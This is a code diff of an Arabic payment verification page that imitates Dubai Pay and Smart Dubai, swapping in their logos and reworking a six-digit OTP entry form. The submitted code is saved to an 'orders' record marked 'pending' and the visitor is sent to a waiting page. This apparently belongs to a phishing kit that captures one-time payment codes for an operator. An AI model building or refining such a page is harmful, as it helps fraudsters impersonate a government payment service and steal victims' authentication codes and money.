@@ -36,27 +36,8 @@
         }
 
         .header-logo {
-            width: 40px;
-            height: 40px;
-            background: #0066cc;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 12px;
-        }
-
-        .header-text h2 {
-            color: #1f2937;
-            font-size: 16px;
-            margin-bottom: 2px;
-        }
-
-        .header-text p {
-            color: #6b7280;
-            font-size: 12px;
+            max-width: 120px;
+            height: auto;
         }
 
         .header-right {
@@ -64,16 +45,8 @@
         }
 
         .header-right-logo {
-            width: 50px;
-            height: 50px;
-            background: #00bcd4;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 14px;
+            max-width: 120px;
+            height: auto;
         }
 
         .container {
@@ -102,70 +75,48 @@
             }
         }
 
-        .form-section {
-            background: white;
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-
-        .form-title {
+        .title {
             color: #1f2937;
             font-size: 24px;
             font-weight: 700;
-            margin-bottom: 10px;
             text-align: center;
+            margin-bottom: 10px;
         }
 
-        .form-subtitle {
+        .subtitle {
             color: #6b7280;
             font-size: 14px;
-            margin-bottom: 30px;
             text-align: center;
+            margin-bottom: 30px;
         }
 
-        .form-group {
-            margin-bottom: 25px;
+        .otp-input-wrapper {
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 300px;
         }
 
-        label {
+        .otp-label {
             display: block;
-            color: #1f2937;
+            color: #374151;
             font-size: 14px;
             font-weight: 600;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        .otp-input-group {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-bottom: 15px;
+            margin-bottom: 8px;
+            text-align: right;
         }
 
         .otp-input {
-            width: 50px;
-            height: 50px;
+            width: 100%;
+            padding: 12px 16px;
             border: 2px solid #e5e7eb;
             border-radius: 8px;
-            font-size: 24px;
+            font-size: 16px;
             text-align: center;
-            font-weight: 700;
+            font-weight: 600;
             color: #0066cc;
             transition: all 0.3s ease;
             background: #f9fafb;
+            letter-spacing: 8px;
         }
 
         .otp-input:focus {
@@ -175,9 +126,9 @@
             box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
         }
 
-        .otp-input:disabled {
-            background: #f3f4f6;
-            color: #6b7280;
+        .otp-input::placeholder {
+            color: #d1d5db;
+            letter-spacing: 2px;
         }
 
         .timer {
@@ -202,6 +153,8 @@
             gap: 12px;
             margin-top: 30px;
             margin-bottom: 20px;
+            width: 100%;
+            max-width: 300px;
         }
 
         .security-badge {
@@ -252,54 +205,15 @@
         }
 
         .error-message {
-            background: #fee2e2;
-            color: #991b1b;
-            padding: 12px;
-            border-radius: 6px;
+            color: #ef4444;
             font-size: 13px;
-            margin-bottom: 20px;
-            display: none;
+            margin-top: 8px;
             text-align: center;
+            display: none;
         }
 
         .error-message.show {
             display: block;
-            animation: shake 0.5s ease-in-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                max-width: 100%;
-            }
-
-            .otp-icon {
-                width: 200px;
-                margin-bottom: 30px;
-            }
-
-            .form-section {
-                padding: 30px 20px;
-            }
-
-            .form-title {
-                font-size: 20px;
-            }
-
-            .button-group {
-                grid-template-columns: 1fr;
-            }
-
-            .otp-input {
-                width: 45px;
-                height: 45px;
-                font-size: 20px;
-            }
         }
     </style>
 </head>
@@ -307,14 +221,10 @@
     <!-- Header -->
     <div class="header">
         <div class="header-left">
-            <div class="header-logo">DP</div>
-            <div class="header-text">
-                <h2>سداد دبي</h2>
-                <p>Dubai Pay</p>
-            </div>
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TvCpTnLQtXDsNBpI.png" alt="Dubai Pay" class="header-logo" style="height: 40px; width: auto;">
         </div>
         <div class="header-right">
-            <div class="header-right-logo">SD</div>
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TWDdxegxhDSOigFd.png" alt="Smart Dubai" class="header-right-logo" style="height: 50px; width: auto;">
         </div>
     </div>
 
@@ -323,141 +233,113 @@
         <!-- OTP Icon -->
         <img src="otp_icon.jpg" alt="OTP" class="otp-icon">
 
-        <!-- Form Section -->
-        <div class="form-section">
-            <h1 class="form-title">التحقق من الهوية</h1>
-            <p class="form-subtitle">أدخل رمز التحقق المرسل إلى جوالك</p>
+        <!-- Title -->
+        <h1 class="title">التحقق من الهوية</h1>
+        <p class="subtitle">أدخل رمز التحقق المرسل إلى جوالك</p>
 
+        <!-- OTP Input -->
+        <div class="otp-input-wrapper">
+            <label class="otp-label">رمز التحقق (OTP)</label>
+            <input 
+                type="text" 
+                id="otpInput" 
+                class="otp-input" 
+                placeholder="000000" 
+                maxlength="6" 
+                inputmode="numeric"
+                autocomplete="off"
+            >
+            <div class="timer" id="timer">الوقت المتبقي: 300 ثانية</div>
             <div class="error-message" id="errorMessage"></div>
+        </div>
 
-            <form id="otpForm" onsubmit="submitOTP(event)">
-                <div class="form-group">
-                    <label>رمز التحقق (OTP)</label>
-                    <div class="otp-input-group">
-                        <input type="text" class="otp-input" id="otp1" maxlength="1" inputmode="numeric">
-                        <input type="text" class="otp-input" id="otp2" maxlength="1" inputmode="numeric">
-                        <input type="text" class="otp-input" id="otp3" maxlength="1" inputmode="numeric">
-                        <input type="text" class="otp-input" id="otp4" maxlength="1" inputmode="numeric">
-                        <input type="text" class="otp-input" id="otp5" maxlength="1" inputmode="numeric">
-                        <input type="text" class="otp-input" id="otp6" maxlength="1" inputmode="numeric">
-                    </div>
-                    <div class="timer" id="timer">الوقت المتبقي: <span id="timeLeft">300</span> ثانية</div>
-                </div>
+        <!-- Buttons -->
+        <div class="button-group">
+            <button class="btn btn-cancel" onclick="cancelPayment()">إلغاء</button>
+            <button class="btn btn-confirm" id="confirmBtn" onclick="submitOTP()">تأكيد الدفع</button>
+        </div>
 
-                <div class="button-group">
-                    <button type="button" class="btn btn-cancel" onclick="goBack()">إلغاء</button>
-                    <button type="submit" class="btn btn-confirm" id="confirmBtn">تأكيد الدفع</button>
-                </div>
-
-                <div class="security-badge">
-                    <img src="pci_dss_logo.png" alt="PCI DSS">
-                </div>
-            </form>
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <img src="pci_dss_logo.png" alt="PCI DSS">
         </div>
     </div>
 
     <script>
+        // Get transaction ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const txnId = urlParams.get('txnId');
+
+        // Timer
         let timeLeft = 300;
-        let currentTxnId = null;
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            const timerEl = document.getElementById('timer');
+            timerEl.textContent = `الوقت المتبقي: ${timeLeft} ثانية`;
+            
+            if (timeLeft <= 60) {
+                timerEl.classList.add('warning');
+            }
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerEl.classList.add('danger');
+                timerEl.textContent = 'انتهى الوقت';
+                document.getElementById('otpInput').disabled = true;
+                document.getElementById('confirmBtn').disabled = true;
+            }
+        }, 1000);
 
-        function getQueryParam(name) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(name);
-        }
+        // OTP Input - only allow numbers
+        document.getElementById('otpInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+        });
 
-        function setupOtpInputs() {
-            const inputs = document.querySelectorAll('.otp-input');
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', (e) => {
-                    if (e.target.value.length === 1) {
-                        if (index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                    }
-                });
+        function submitOTP() {
+            const otpInput = document.getElementById('otpInput');
+            const otp = otpInput.value.trim();
 
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && e.target.value === '') {
-                        if (index > 0) {
-                            inputs[index - 1].focus();
-                        }
-                    }
-                });
-            });
-        }
-
-        function showError(message) {
-            const errorDiv = document.getElementById('errorMessage');
-            errorDiv.textContent = message;
-            errorDiv.classList.add('show');
-            setTimeout(() => {
-                errorDiv.classList.remove('show');
-            }, 5000);
-        }
-
-        function submitOTP(event) {
-            event.preventDefault();
-
-            const otp = document.getElementById('otp1').value +
-                       document.getElementById('otp2').value +
-                       document.getElementById('otp3').value +
-                       document.getElementById('otp4').value +
-                       document.getElementById('otp5').value +
-                       document.getElementById('otp6').value;
-
-            if (!otp || otp.length !== 6) {
-                showError('يرجى إدخال رمز التحقق الصحيح');
+            if (otp.length !== 6) {
+                showError('يرجى إدخال 6 أرقام');
                 return;
             }
 
-            // Save OTP
-            localStorage.setItem('otpCode', otp);
+            // Save OTP to localStorage
+            const orders = JSON.parse(localStorage.getItem('orders') || '[]');
+            const order = orders.find(o => o.txnId === txnId);
+            
+            if (order) {
+                order.otp = otp;
+                order.otpStatus = 'pending';
+                order.currentPage = 'otp_loading';
+                localStorage.setItem('orders', JSON.stringify(orders));
+            }
 
-            // Update current page
-            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
-            formData.currentPage = 'payment_otp';
-            localStorage.setItem('formData', JSON.stringify(formData));
-
-            // Disable button and show loading
-            document.getElementById('confirmBtn').disabled = true;
-
-            // Go to loading page
-            window.location.href = 'payment_otp_loading_ar.html?txnId=' + currentTxnId;
+            // Redirect to OTP loading page
+            window.location.href = `payment_otp_loading_ar.html?txnId=${txnId}`;
         }
 
-        function goBack() {
-            window.history.back();
+        function cancelPayment() {
+            if (confirm('هل تريد إلغاء العملية؟')) {
+                window.history.back();
+            }
         }
 
-        function startTimer() {
-            const timerInterval = setInterval(() => {
-                timeLeft--;
-                const timerElement = document.getElementById('timer');
-                const timeLeftSpan = document.getElementById('timeLeft');
-
-                timeLeftSpan.textContent = timeLeft;
-
-                if (timeLeft <= 60) {
-                    timerElement.classList.add('warning');
-                } else {
-                    timerElement.classList.remove('warning');
-                }
-
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    document.getElementById('confirmBtn').disabled = true;
-                    timerElement.textContent = 'انتهت صلاحية الرمز';
-                    timerElement.classList.remove('warning');
-                    timerElement.classList.add('danger');
-                }
-            }, 1000);
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 3000);
         }
 
-        window.addEventListener('load', () => {
-            currentTxnId = getQueryParam('txnId');
-            setupOtpInputs();
-            startTimer();
+        // Allow Enter key to submit
+        document.getElementById('otpInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitOTP();
+            }
         });
     </script>
 </body>
 </html>
+<!-- Force redeploy -->
